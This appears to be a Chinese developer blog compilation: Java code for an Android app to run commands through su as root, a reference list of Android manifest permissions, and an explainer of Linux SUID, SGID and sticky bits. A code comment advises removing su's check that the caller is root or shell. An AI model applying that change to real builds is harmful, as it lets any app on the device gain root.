\u8bbf\u95ee\u5e95\u5c42Linux\u4e0b\u7684\u7a0b\u5e8f\u6216\u811a\u672c\uff0c\u8fd9\u6837\u5c31\u80fd\u6267\u884csu\u547d\u4ee4\uff0c\u4f7fapk\u5177\u6709root\u6743\u9650\uff0c\u80fd\u591f\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u9700\u8981root\u6743\u9650\u624d\u80fd\u6267\u884c\u7684\u7a0b\u5e8f\u6216\u811a\u672c\u4e86\uff0c\u5177\u4f53\u4f8b\u5b50\uff1a package com.visit.dialoglog; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.IOException; import android.app.Activity; import android.os.Bundle; import android.util.Log; public class VisitRootfileActivity extends Activity { private static final String TAG = \"VisitRootfileActivity\"; Process process = null; Process process1 = null; DataOutputStream os = null; DataInputStream is = null; /** Called when the activity is first created. */ @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); try { process = Runtime.getRuntime().exec(\"/system/xbin/su\"); /*\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u4fee\u6539su \u7684\u6e90\u4ee3\u7801 \uff08\u6ce8\u6389 if (myuid != AID_ROOT && myuid != AID_SHELL) {*/ os = new DataOutputStream(process.getOutputStream()); is = new DataInputStream(process.getInputStream()); os.writeBytes(\"/system/bin/ls\" + \" \\n\"); //\u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u5177\u6709root \u6743\u9650\u7684\u7a0b\u5e8f\u4e86 os.writeBytes(\" exit \\n\"); os.flush(); process.waitFor(); } catch (Exception e) { Log.e(TAG, \"Unexpected error - Here is what I know:\" + e.getMessage()); } finally { try { if (os != null) { os.close(); } if (is != null) { is.close(); } process.destroy(); } catch (Exception e) { } }// get the root privileges } } APK\u5728AndroidManifest.xml\u5e38\u7528\u6743\u9650 android.permission.ACCESS_CHECKIN_PROPERTIES //\u5141\u8bb8\u8bfb\u5199\u8bbf\u95ee\u201dproperties\u201d\u8868\u5728checkin\u6570\u636e\u5e93\u4e2d\uff0c\u6539\u503c\u53ef\u4ee5\u4fee\u6539\u4e0a\u4f20 android.permission.ACCESS_COARSE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95eeCellID\u6216WiFi\u70ed\u70b9\u6765\u83b7\u53d6\u7c97\u7565\u7684\u4f4d\u7f6e android.permission.ACCESS_FINE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u7cbe\u826f\u4f4d\u7f6e(\u5982GPS) android.permission.ACCESS_LOCATION_EXTRA_COMMANDS //\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u989d\u5916\u7684\u4f4d\u7f6e\u63d0\u4f9b\u547d\u4ee4 android.permission.ACCESS_MOCK_LOCATION //\u5141\u8bb8\u7a0b\u5e8f\u521b\u5efa\u6a21\u62df\u4f4d\u7f6e\u63d0\u4f9b\u7528\u4e8e\u6d4b\u8bd5 android.permission.ACCESS_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95ee\u6709\u5173GSM\u7f51\u7edc\u4fe1\u606f android.permission.ACCESS_SURFACE_FLINGER //\u5141\u8bb8\u7a0b\u5e8f\u4f7f\u7528SurfaceFlinger\u5e95\u5c42\u7279\u6027 android.permission.ACCESS_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95eeWi-Fi\u7f51\u7edc\u72b6\u6001\u4fe1\u606f android.permission.ADD_SYSTEM_SERVICE //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u5e03\u7cfb\u7edf\u7ea7\u670d\u52a1 android.permission.BATTERY_STATS //\u5141\u8bb8\u7a0b\u5e8f\u66f4\u65b0\u624b\u673a\u7535\u6c60\u7edf\u8ba1\u4fe1\u606f android.permission.BLUETOOTH //\u5141\u8bb8\u7a0b\u5e8f\u8fde\u63a5\u5230\u5df2\u914d\u5bf9\u7684\u84dd\u7259\u8bbe\u5907 android.permission.BLUETOOTH_ADMIN //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u73b0\u548c\u914d\u5bf9\u84dd\u7259\u8bbe\u5907 android.permission.BRICK //\u8bf7\u6c42\u80fd\u591f\u7981\u7528\u8bbe\u5907(\u975e\u5e38\u5371\u9669 android.permission.BROADCAST_PACKAGE_REMOVED //\u5141\u8bb8\u7a0b\u5e8f\u5e7f\u64ad\u4e00\u4e2a\u63d0\u793a\u6d88\u606f\u5728\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5305\u5df2\u7ecf\u79fb\u9664\u540e android.permission.BROADCAST_STICKY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5e7f\u64ad\u5e38\u7528intents android.permission.CALL_PHONE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u521d\u59cb\u5316\u4e00\u4e2a\u7535\u8bdd\u62e8\u53f7\u4e0d\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CALL_PRIVILEGED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u62e8\u6253\u4efb\u4f55\u53f7\u7801\uff0c\u5305\u542b\u7d27\u6025\u53f7\u7801\u65e0\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CAMERA //\u8bf7\u6c42\u8bbf\u95ee\u4f7f\u7528\u7167\u76f8\u8bbe\u5907 android.permission.CHANGE_COMPONENT_ENABLED_STATE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u662f\u5426\u6539\u53d8\u4e00\u4e2a\u7ec4\u4ef6\u6216\u5176\u4ed6\u7684\u542f\u7528\u6216\u7981\u7528 android.permission.CHANGE_CONFIGURATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5f53\u524d\u8bbe\u7f6e\uff0c\u5982\u672c\u5730\u5316 android.permission.CHANGE_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8\u7f51\u7edc\u8fde\u63a5\u72b6\u6001 android.permission.CHANGE_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Wi-Fi\u8fde\u63a5\u72b6\u6001 android.permission.CLEAR_APP_CACHE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u695a\u7f13\u5b58\u4ece\u6240\u6709\u5b89\u88c5\u7684\u7a0b\u5e8f\u5728\u8bbe\u5907\u4e2d android.permission.CLEAR_APP_USER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u9664\u7528\u6237\u8bbe\u7f6e android.permission.CONTROL_LOCATION_UPDATES //\u5141\u8bb8\u542f\u7528\u7981\u6b62\u4f4d\u7f6e\u66f4\u65b0\u63d0\u793a\u4ece\u65e0\u7ebf\u6a21\u5757 android.permission.DELETE_CACHE_FILES //\u5141\u8bb8\u7a0b\u5e8f\u5220\u9664\u7f13\u5b58\u6587\u4ef6 android.permission.DELETE_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5220\u9664\u5305 android.permission.DEVICE_POWER //\u5141\u8bb8\u8bbf\u95ee\u5e95\u5c42\u7535\u6e90\u7ba1\u7406 android.permission.DIAGNOSTIC //\u5141\u8bb8\u7a0b\u5e8fRW\u8bca\u65ad\u8d44\u6e90 android.permission.DISABLE_KEYGUARD //\u5141\u8bb8\u7a0b\u5e8f\u7981\u7528\u952e\u76d8\u9501 android.permission.DUMP //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u72b6\u6001\u6293\u53d6\u4fe1\u606f\u4ece\u7cfb\u7edf\u670d\u52a1 android.permission.EXPAND_STATUS_BAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6269\u5c55\u6536\u7f29\u5728\u72b6\u6001\u680f,android\u5f00\u53d1\u7f51\u63d0\u793a\u5e94\u8be5\u662f\u4e00\u4e2a\u7c7b\u4f3cWindows Mobile\u4e2d\u7684\u6258\u76d8\u7a0b\u5e8f android.permission.FACTORY_TEST //\u4f5c\u4e3a\u4e00\u4e2a\u5de5\u5382\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u8fd0\u884c\u5728root\u7528\u6237 android.permission.FLASHLIGHT //\u8bbf\u95ee\u95ea\u5149\u706f,android\u5f00\u53d1\u7f51\u63d0\u793aHTC Dream\u4e0d\u5305\u542b\u95ea\u5149\u706f android.permission.FORCE_BACK //\u5141\u8bb8\u7a0b\u5e8f\u5f3a\u884c\u4e00\u4e2a\u540e\u9000\u64cd\u4f5c\u662f\u5426\u5728\u9876\u5c42activities android.permission.FOTA_UPDATE //\u6682\u65f6\u4e0d\u4e86\u89e3\u8fd9\u662f\u505a\u4ec0\u4e48\u4f7f\u7528\u7684\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u4e00\u4e2a\u9884\u7559\u6743\u9650. android.permission.GET_ACCOUNTS //\u8bbf\u95ee\u4e00\u4e2a\u5e10\u6237\u5217\u8868\u5728Accounts Service\u4e2d android.permission.GET_PACKAGE_SIZE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4efb\u4f55package\u5360\u7528\u7a7a\u95f4\u5bb9\u91cf android.permission.GET_TASKS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4fe1\u606f\u6709\u5173\u5f53\u524d\u6216\u6700\u8fd1\u8fd0\u884c\u7684\u4efb\u52a1\uff0c\u4e00\u4e2a\u7f29\u7565\u7684\u4efb\u52a1\u72b6\u6001\uff0c\u662f\u5426\u6d3b\u52a8\u7b49\u7b49 android.permission.HARDWARE_TEST //\u5141\u8bb8\u8bbf\u95ee\u786c\u4ef6 android.permission.INJECT_EVENTS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u622a\u83b7\u7528\u6237\u4e8b\u4ef6\u5982\u6309\u952e\u3001\u89e6\u6478\u3001\u8f68\u8ff9\u7403\u7b49\u7b49\u5230\u4e00\u4e2a\u65f6\u95f4\u6d41\uff0candroid\u5f00\u53d1\u7f51\u63d0\u9192\u7b97\u662fhook\u6280\u672f\u5427 android.permission.INSTALL_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5b89\u88c5packages android.permission.INTERNAL_SYSTEM_WINDOW //\u5141\u8bb8\u6253\u5f00\u7a97\u53e3\u4f7f\u7528\u7cfb\u7edf\u7528\u6237\u754c\u9762 android.permission.INTERNET //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u7f51\u7edc\u5957\u63a5\u5b57 android.permission.MANAGE_APP_TOKENS //\u5141\u8bb8\u7a0b\u5e8f\u7ba1\u7406(\u521b\u5efa\u3001\u50ac\u540e\u3001 z- order\u9ed8\u8ba4\u5411z\u8f74\u63a8\u79fb)\u7a0b\u5e8f\u5f15\u7528\u5728\u7a97\u53e3\u7ba1\u7406\u5668\u4e2d android.permission.MASTER_CLEAR //\u76ee\u524d\u8fd8\u6ca1\u6709\u660e\u786e\u7684\u89e3\u91ca\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u6e05\u9664\u4e00\u5207\u6570\u636e\uff0c\u7c7b\u4f3c\u786c\u683c\u673a android.permission.MODIFY_AUDIO_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539\u5168\u5c40\u97f3\u9891\u8bbe\u7f6e android.permission.MODIFY_PHONE_STATE //\u5141\u8bb8\u4fee\u6539\u8bdd\u673a\u72b6\u6001\uff0c\u5982\u7535\u6e90\uff0c\u4eba\u673a\u63a5\u53e3\u7b49 android.permission.MOUNT_UNMOUNT_FILESYSTEMS //\u5141\u8bb8\u6302\u8f7d\u548c\u53cd\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u53ef\u79fb\u52a8\u5b58\u50a8 android.permission.PERSISTENT_ACTIVITY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbe\u7f6e\u4ed6\u7684activities\u663e\u793a android.permission.PROCESS_OUTGOING_CALLS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u89c6\u3001\u4fee\u6539\u6709\u5173\u64ad\u51fa\u7535\u8bdd android.permission.READ_CALENDAR //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.READ_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.READ_FRAME_BUFFER //\u5141\u8bb8\u7a0b\u5e8f\u5c4f\u5e55\u6ce2\u6216\u548c\u66f4\u591a\u5e38\u89c4\u7684\u8bbf\u95ee\u5e27\u7f13\u51b2\u6570\u636e android.permission.READ_INPUT_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u5f53\u524d\u6309\u952e\u72b6\u6001 android.permission.READ_LOGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u5e95\u5c42\u7cfb\u7edf\u65e5\u5fd7\u6587\u4ef6 android.permission.READ_OWNER_DATA //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.READ_SMS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u77ed\u4fe1\u606f android.permission.READ_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u8bbe\u7f6e android.permission.READ_SYNC_STATS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u72b6\u6001 android.permission.REBOOT //\u8bf7\u6c42\u80fd\u591f\u91cd\u65b0\u542f\u52a8\u8bbe\u5907 android.permission.RECEIVE_BOOT_COMPLETED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u63a5\u6536\u5230 android.permission.RECEIVE_MMS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230MMS\u5f69\u4fe1,\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u4e00\u4e2a\u5c06\u6536\u5230\u77ed\u4fe1\u606f\uff0c\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_WAP_PUSH //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230WAP PUSH\u4fe1\u606f android.permission.RECORD_AUDIO //\u5141\u8bb8\u7a0b\u5e8f\u5f55\u5236\u97f3\u9891 android.permission.REORDER_TASKS //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Z\u8f74\u6392\u5217\u4efb\u52a1 android.permission.RESTART_PACKAGES //\u5141\u8bb8\u7a0b\u5e8f\u91cd\u65b0\u542f\u52a8\u5176\u4ed6\u7a0b\u5e8f android.permission.SEND_SMS //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u9001SMS\u77ed\u4fe1 android.permission.SET_ACTIVITY_WATCHER //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u6216\u63a7\u5236activities\u5df2\u7ecf\u542f\u52a8\u5168\u5c40\u7cfb\u7edf\u4e2d android.permission.SET_ALWAYS_FINISH //\u5141\u8bb8\u7a0b\u5e8f\u63a7\u5236\u662f\u5426\u6d3b\u52a8\u95f4\u63a5\u5b8c\u6210\u5728\u5904\u4e8e\u540e\u53f0\u65f6 android.permission.SET_ANIMATION_SCALE //\u4fee\u6539\u5168\u5c40\u4fe1\u606f\u6bd4\u4f8b android.permission.SET_DEBUG_APP //\u914d\u7f6e\u4e00\u4e2a\u7a0b\u5e8f\u7528\u4e8e\u8c03\u8bd5 android.permission.SET_ORIENTATION //\u5141\u8bb8\u5e95\u5c42\u8bbf\u95ee\u8bbe\u7f6e\u5c4f\u5e55\u65b9\u5411\u548c\u5b9e\u9645\u65cb\u8f6c android.permission.SET_PREFERRED_APPLICATIONS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5217\u8868\u53c2\u6570PackageManager.addPackageToPreferred()\u548cPackageManager.removePackageFromPreferred()\u65b9\u6cd5 android.permission.SET_PROCESS_FOREGROUND //\u5141\u8bb8\u7a0b\u5e8f\u5f53\u524d\u8fd0\u884c\u7a0b\u5e8f\u5f3a\u884c\u5230\u524d\u53f0 android.permission.SET_PROCESS_LIMIT //\u5141\u8bb8\u8bbe\u7f6e\u6700\u5927\u7684\u8fd0\u884c\u8fdb\u7a0b\u6570\u91cf android.permission.SET_TIME_ZONE //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u65f6\u95f4\u533a\u57df android.permission.SET_WALLPAPER //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8 android.permission.SET_WALLPAPER_HINTS //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8hits android.permission.SIGNAL_PERSISTENT_PROCESSES //\u5141\u8bb8\u7a0b\u5e8f\u8bf7\u6c42\u53d1\u9001\u4fe1\u53f7\u5230\u6240\u6709\u663e\u793a\u7684\u8fdb\u7a0b\u4e2d android.permission.STATUS_BAR //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u3001\u5173\u95ed\u6216\u7981\u7528\u72b6\u6001\u680f\u53ca\u56fe\u6807Allows an application to open, close, or disable the status bar and its icons. android.permission.SUBSCRIBED_FEEDS_READ //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u8ba2\u9605RSS Feed\u5185\u5bb9\u63d0\u4f9b android.permission.SUBSCRIBED_FEEDS_WRITE //\u7cfb\u7edf\u6682\u65f6\u4fdd\u7559\u6539\u8bbe\u7f6e,android\u5f00\u53d1\u7f51\u8ba4\u4e3a\u672a\u6765\u7248\u672c\u4f1a\u52a0\u5165\u8be5\u529f\u80fd\u3002 android.permission.SYSTEM_ALERT_WINDOW //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5f00\u7a97\u53e3\u4f7f\u7528 TYPE_SYSTEM_ALERT\uff0c\u663e\u793a\u5728\u5176\u4ed6\u6240\u6709\u7a0b\u5e8f\u7684\u9876\u5c42(Allows an application to open windows using the type TYPE_SYSTEM_ALERT, shown on top of all other applications. ) android.permission.VIBRATE //\u5141\u8bb8\u8bbf\u95ee\u632f\u52a8\u8bbe\u5907 android.permission.WAKE_LOCK //\u5141\u8bb8\u4f7f\u7528PowerManager\u7684 WakeLocks\u4fdd\u6301\u8fdb\u7a0b\u5728\u4f11\u7720\u65f6\u4ece\u5c4f\u5e55\u6d88\u5931 android.permission.WRITE_APN_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165APN\u8bbe\u7f6e android.permission.WRITE_CALENDAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.WRITE_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.WRITE_GSERVICES //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539Google\u670d\u52a1\u5730\u56fe android.permission.WRITE_OWNER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.WRITE_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6216\u5199\u5165\u7cfb\u7edf\u8bbe\u7f6e android.permission.WRITE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u77ed\u4fe1 android.permission.WRITE_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u540c\u6b65\u8bbe\u7f6e Linux\u7684\u7279\u6b8a\u6587\u4ef6\u6743\u9650 \u53d1\u5e03\u4e8e: \u4e00\u822c\u6587\u4ef6\u6743\u9650\u8bfb\uff08R\uff09\uff0c\u5199(W)\uff0c\u6267\u884c\uff08X\uff09\u6743\u9650\u6bd4\u8f83\u7b80\u5355\u3002\u4e00\u822c\u6750\u6599\u4e0a\u9762\u90fd\u6709\u4ecb\u7ecd\u3002 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0b\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u6743\u9650\u2014\u2014SUID\uff0cSGID\uff0cStick bit\u3002\u5982\u679c\u4f60\u68c0\u67e5\u4e00\u4e0b/usr/bin/passwd\u548c/tmp/\u7684\u6587\u4ef6\u6743\u9650\u4f60\u5c31\u4f1a\u53d1\u73b0\u548c\u666e\u901a\u7684\u6587\u4ef6\u6743\u9650\u6709\u5c11\u8bb8\u4e0d\u540c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8fd9\u91cc\u5c31\u6d89\u53ca\u5230SUID\u548cStick bit\u3002 SUID\u548cSGID \u6211\u4eec\u9996\u5148\u6765\u8c08\u4e00\u4e0bpasswd\u7a0b\u5e8f\u7279\u6b8a\u7684\u5730\u65b9\u3002\u5927\u5bb6\u90fd\u77e5\u9053\uff0cLinux\u628a\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f\u5b58\u653e\u5728/etc/shadow\u91cc\u9762\uff0c\u8be5\u6587\u4ef6\u5c5e\u6027\u5982\u4e0b\uff1a \u53ef\u4ee5\u770b\u5230Shadow\u7684\u53ea\u6709\u6240\u6709\u8005\u53ef\u8bfb\u5199\uff0c\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u8be5\u6587\u4ef6\u5bf9\u666e\u901a\u7528\u6237\u662f\u4e0d\u53ef\u8bfb\u5199\u7684\u3002\u4f46\u662f\u666e\u901a\u7528\u6237\u8c03\u7528passwd\u7a0b\u5e8f\u662f\u53ef\u4ee5\u4fee\u6539\u81ea\u5df1\u7684\u5bc6\u7801\u7684\uff0c\u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\u96be\u9053\u666e\u901a\u7528\u6237\u53ef\u4ee5\u8bfb\u5199shadow\u6587\u4ef6\uff1f\u5f53\u7136\u4e0d\u662f\u5566\u3002password\u53ef\u4ee5\u4fee\u6539shadow\u6587\u4ef6\u7684\u539f\u56e0\u662f\u4ed6\u8bbe\u7f6e\u4e86SUID\u6587\u4ef6\u6743\u9650\u3002 SUID\u6587\u4ef6\u6743\u9650\u4f5c\u7528\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u3002\u4e00\u822c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5728\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u662f\u5f53\u524d\u7528\u6237\uff0c\u6bd4\u5982\u5f53\u524d\u7cfb\u7edf\u7528\u6237\u662fsimon\uff0csimon\u8fd0\u884c\u7a0b\u5e8fa.out\uff0ca.out\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u5e94\u8be5\u662fsimon\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u7ed9\u53ef\u6267\u884c\u6587\u4ef6\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5219\u8be5\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u6240\u6709\u8005\uff0c\u5c31\u662f\u8be5\u6587\u4ef6\u6240\u6709\u8005 \u3002\u8fd8\u4ee5\u524d\u9762\u7684a.out\u4e3a\u4f8b\uff0c\u5047\u5982a.out\u8bbe\u7f6e\u4e86SUID\uff0c\u5e76\u4e14\u5176\u6240\u6709\u8005\u662froot\uff0c\u7cfb\u7edf\u5f53\u524d\u7528\u6237\u662fsimon\uff0c\u5f53simon\u8fd0\u884ca.out\u7684\u65f6\u5019\uff0ca.out\u5728\u8fd0\u884c\u671f\u7684\u6240\u6709\u8005\u5c31\u662froot\uff0c\u8fd9\u65f6a.out\u53ef\u4ee5\u5b58\u53d6\u53ea\u6709root\u6743\u9650\u624d\u80fd\u5b58\u53d6\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u8bfb\u5199shadow\u6587\u4ef6\u3002\u5f53a.out\u6267\u884c\u7ed3\u675f\u7684\u65f6\u5019\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u53c8\u56de\u5230\u4e86simon\u7684\u6743\u9650\u4e86\u3002 passwd\u5c31\u662f\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5e76\u4e14passwd\u7684\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u6240\u6709\u7684\u7528\u6237\u90fd\u53ef\u4ee5\u6267\u884c\u4ed6\uff0c\u5728passwd\u8fd0\u884c\u671f\uff0c\u7a0b\u5e8f\u83b7\u5f97\u4e34\u65f6\u7684root\u6743\u9650\uff0c\u8fd9\u65f6\u5176\u53ef\u4ee5\u5b58\u53d6shadow\u6587\u4ef6\u3002\u5f53passwd\u8fd0\u884c\u5b8c\u6210\uff0c\u5f53\u524d\u7528\u6237\u53c8\u56de\u5230\u666e\u901a\u6743\u9650\u3002 \u540c\u7406\uff0c\u8bbe\u7f6e\u7a0b\u5e8f\u7684SGID\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u671f\u53ef\u4ee5\u4e34\u65f6\u83b7\u5f97\u6240\u6709\u8005\u7ec4\u7684\u6743\u9650\u3002\u5728\u56e2\u961f\u5f00\u53d1\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6743\u9650\u6bd4\u8f83\u6709\u7528\uff0c\u4e00\u822c\u7cfb\u7edf\u7528SUID\u6bd4\u8f83\u591a\u3002 SGID\u53ef\u4ee5\u7528\u4e8e\u76ee\u5f55\uff0c\u5f53\u76ee\u5f55\u8bbe\u7f6e\u4e86SGID\u4e4b\u540e\uff0c\u5728\u8be5\u76ee\u5f55\u4e0b\u9762\u5efa\u7acb\u7684\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u76f8\u540c\u7684\u7528\u6237\u7ec4\u3002 Stick bit(\u7c98\u8d34\u4f4d) \u5bf9\u7a0b\u5e8f\uff0c\u8be5\u6743\u9650\u544a\u8bc9\u7cfb\u7edf\u5728\u7a0b\u5e8f\u5b8c\u6210\u540e\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e00\u4efd\u8fd0\u884c\u7a0b\u5e8f\u7684\u5907\u4efd\uff0c\u5982\u8be5\u7a0b\u5e8f\u5e38\u7528\uff0c\u53ef\u4e3a\u7cfb\u7edf\u8282\u7701\u70b9\u65f6\u95f4\uff0c\u4e0d\u7528\u6bcf\u6b21\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u3002Linux\u5f53\u524d\u5bf9\u6587\u4ef6\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u4e00\u4e9b\u5176\u4ed6\u7684UNIX\u7cfb\u7edf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002 Stick bit\u53ef\u4ee5\u4f5c\u7528\u4e8e\u76ee\u5f55\uff0c\u5728\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u7684\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u53ea\u6709\u6240\u6709\u8005\u548croot\u53ef\u4ee5\u5220\u9664\u4ed6\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u56de\u5934\u53bb\u770b\u770b/tmp/\u76ee\u5f55\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u76ee\u5f55\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u3002\u6240\u4ee5\u8bf4\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5bf9\u8be5\u76ee\u5f55\u8bfb\u5199\u6267\u884c\uff08777\uff09\uff0c\u8fd9\u6837\u610f\u5473\u7740\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5728/tmp/\u4e0b\u9762\u521b\u5efa\u4e34\u65f6\u76ee\u5f55\u3002\u56e0\u4e3a\u8bbe\u7f6eStick bit\u53ea\u6709\u6240\u6709\u8005\u548croot\u624d\u80fd\u5220\u9664\u76ee\u5f55\u3002\u8fd9\u6837\u666e\u901a\u7528\u6237\u53ea\u80fd\u5220\u9664\u5c5e\u4e8e\u81ea\u5df1\u7684\u6587\u4ef6\uff0c\u800c\u4e0d\u80fd\u5220\u9664\u5176\u4ed6\u4eba\u7684\u6587\u4ef6\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8bbe\u7f6eSUID\uff0cSGID\uff0cStick bit 